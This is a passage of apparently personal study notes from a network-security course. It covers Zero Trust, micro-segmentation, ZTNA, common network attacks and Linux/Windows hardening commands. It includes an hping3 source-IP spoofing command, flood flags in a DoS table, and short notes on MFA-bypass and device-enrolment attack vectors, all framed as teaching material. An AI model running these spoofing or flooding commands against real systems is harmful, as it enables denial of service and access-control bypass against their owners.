Traditional segmentation: VLANs separate departments. But within a VLAN, hosts can reach each other freely.

Micro-segmentation applies firewall policy **between individual workloads** — not just between network segments. Even two servers in the same VLAN, same subnet, cannot communicate unless explicitly permitted.

**Implementation methods**:

*Host-based firewalls* (software-defined segmentation):
```powershell
# Windows Firewall — block all inbound by default, permit only required
New-NetFirewallRule -DisplayName "Allow HTTP from AppServer" `
  -Direction Inbound -Action Allow -Protocol TCP -LocalPort 80 `
  -RemoteAddress 192.168.10.50
```

*VMware NSX / Cisco ACI* — network virtualisation platforms that apply micro-segmentation at the hypervisor level — no traffic leaves the physical host unnecessarily.

*Cloud security groups* (AWS, Azure, GCP) — each VM has a security group that acts as a micro-firewall, controlling inbound/outbound per port and source.

### Identity-Based Access

In Zero Trust, network location is irrelevant. What matters is **who you are and what you are trying to access**.

**Every access request evaluated on**:
- **User identity**: Authenticated via MFA, validated against IdP (Azure AD, Okta)
- **Device health**: Is the device compliant (patched, encrypted, enrolled in MDM)?
- **Resource sensitivity**: What data/service is being accessed?
- **Context**: Normal working hours? Known location? Normal behaviour?
- **Least privilege**: Does this user/device actually need this access for this task?

**Conditional Access** (Microsoft Azure AD example):
```
IF: User = Sales Team member
AND: Device = Compliant (Intune-managed, patched)
AND: Location = Known office IP OR MFA completed
THEN: Allow access to Salesforce
ELSE: Block or require step-up MFA
```

### Zero Trust Network Access (ZTNA)

ZTNA replaces traditional VPN:
- Traditional VPN: authenticate once → access everything inside
- ZTNA: authenticate per application → access only that specific application

**Products**: Zscaler Private Access, Cloudflare Access, Palo Alto Prisma Access, BeyondCorp (Google)

```
User (remote) → Identity Provider (login + MFA) → ZTNA controller
ZTNA controller evaluates policy → grants access only to specific app
User's device never joins the internal network — tunnelled to app only
```

### Pentest Lens — Zero Trust

**Zero Trust does not eliminate attack surface — it changes it.**

```
Old attack: Compromise perimeter → move freely inside
ZT attack: Compromise a high-privilege identity or device → abuse legitimate access paths
```

**Key ZT attack vectors**:

*Identity attacks*: Phishing to steal credentials, MFA bypass (MFA fatigue / SIM swap), OAuth/OIDC token theft.

*Device-based attacks*: Enrol a compromised device as "compliant" (bypass MDM checks), steal device certificates.

*Service account / API key abuse*: Service accounts often bypass MFA. Stealing an API key grants application-level access through the ZT controls.

*Lateral movement within permitted paths*: In ZT, you can still move along permitted paths. If you compromise a user who legitimately has access to multiple systems, you still have that access.

**Detection**: ZT generates rich access logs (every access attempt, granted or denied). Attackers operating within ZT generate telemetry — anomaly detection becomes critical.

---

## 11. Common Network Attack Reference

### DNS Hijacking

Attacker modifies DNS responses to redirect traffic to malicious servers. Methods:
1. **Cache poisoning**: Inject forged DNS records into a resolver's cache
2. **MITM DNS spoofing**: Intercept DNS queries and respond with false IPs (Bettercap)
3. **Router DNS hijacking**: Compromise router, change its DNS setting to attacker-controlled resolver
4. **Rogue DHCP**: Hand out attacker's DNS server via DHCP (covered in Module 1)

### BGP Hijacking

AS announces a route for a prefix it doesn't own. Traffic destined for the victim is redirected.

```
Legitimate: AS64496 owns 203.0.113.0/24
Attack: AS64511 announces 203.0.113.0/25 (more specific — BGP prefers more specific)
Result: Traffic for 203.0.113.0-127 goes to AS64511 instead of AS64496
```

Mitigation: RPKI route origin validation, BGP monitoring.

### IP Spoofing

Sending packets with a forged source IP address. Used for:
- Hiding identity in DoS attacks
- Reflection/amplification DDoS
- Bypassing IP-based access controls
- Historical TCP session hijacking

```bash
hping3 -a <spoofed-source-IP> -S -p 80 <target>    # Spoof source in SYN packet
```

**Limitation**: Spoofed packets cannot receive responses (responses go to the real owner of the spoofed IP). Only effective for one-way attacks or reflection attacks.

**Mitigation**: BCP38 ingress filtering — ISPs/routers drop packets where source IP is not reachable via the interface they arrived on.

---

## Quick Reference — Module 4

### CIA Triad — Network Controls
| Property | Threat | Controls |
|----------|--------|---------|
| Confidentiality | Eavesdropping, sniffing | TLS, VPN, VLAN, ACLs |
| Integrity | MITM modification, route injection | TLS MAC, DNSSEC, SMB signing, routing auth |
| Availability | DoS/DDoS, loops, exhaustion | Rate limiting, SYN cookies, STP Guard, redundancy |

### DoS/DDoS Attack Types
| Type | Target | Example | Mitigation |
|------|--------|---------|-----------|
| UDP/ICMP Flood | Bandwidth | hping3 flood | Upstream scrubbing |
| Amplification | Bandwidth (reflected) | DNS/NTP amplification | BCP38, disable open resolvers |
| SYN Flood | TCP state table | hping3 -S --flood | SYN cookies |
| Slowloris | HTTP connection pool | slowloris tool | Connection timeouts |
| HTTP Flood | Application CPU | curl loop | WAF rate limiting |
| SSL Exhaustion | CPU (TLS handshake) | TLS handshake flood | TLS offloading, rate limit |

### TLS Version Comparison
| Feature | TLS 1.2 | TLS 1.3 |
|---------|---------|---------|
| Handshake RTTs | 2 | 1 |
| RSA key exchange | Yes (no PFS) | Removed |
| Weak ciphers | Must disable manually | Removed by spec |
| Certificate encrypted | No | Yes |
| PFS | Optional (ECDHE) | Mandatory |

### 802.1X Key Components
| Component | Role | Protocol |
|-----------|------|---------|
| Supplicant | Client authenticating | EAPOL |
| Authenticator | Switch/AP enforcing auth | EAPOL + RADIUS |
| Authentication Server | RADIUS — validates credentials | RADIUS (UDP 1812) |

### Zero Trust vs Perimeter
| Aspect | Perimeter Model | Zero Trust |
|--------|----------------|-----------|
| Trust boundary | Network edge | Per request, per resource |
| Inside network | Fully trusted | No implicit trust |
| Credential compromise impact | Full internal access | Limited to permitted resources |
| Lateral movement | Unrestricted internally | Blocked by micro-segmentation |

### Key Hardening Commands
```bash
# Linux — disable ICMP redirects
echo 0 > /proc/sys/net/ipv4/conf/all/accept_redirects
echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects

# Enable SYN cookies
echo 1 > /proc/sys/net/ipv4/tcp_syncookies

# Disable IP forwarding (on hosts that are not routers)
echo 0 > /proc/sys/net/ipv4/ip_forward

# Persistent (add to /etc/sysctl.conf):
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.tcp_syncookies = 1
net.ipv4.ip_forward = 0
```

```powershell
# Windows — enable SMB signing
Set-SmbServerConfiguration -RequireSecuritySignature $true
Set-SmbClientConfiguration -RequireSecuritySignature $true

# Disable LLMNR
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" "EnableMulticast" 0
```

---

## Related Notes
- [[Module-00-Foundations]] — OSI layers map to attack categories in this module
- [[Module-02-Devices-Infrastructure]] — STP attacks, VLAN hopping covered there
- [[Module-03-Protocols-Deep-Dive]] — Kerberos attacks, LLMNR/NBT-NS poisoning detail
- [[Module-05-Firewall-Configuration]] — Implementing zone-based security controls
- [[Module-06-Network-Monitoring]] — SIEM, IDS/IPS, NetFlow for detecting attacks in this module
- [[Module-08-Wireless-Networking]] — Evil twin, WPA2-Enterprise (802.1X for wireless)
- [[Module-12-Pentest-Perspective]] — Full attack chains using techniques from this module
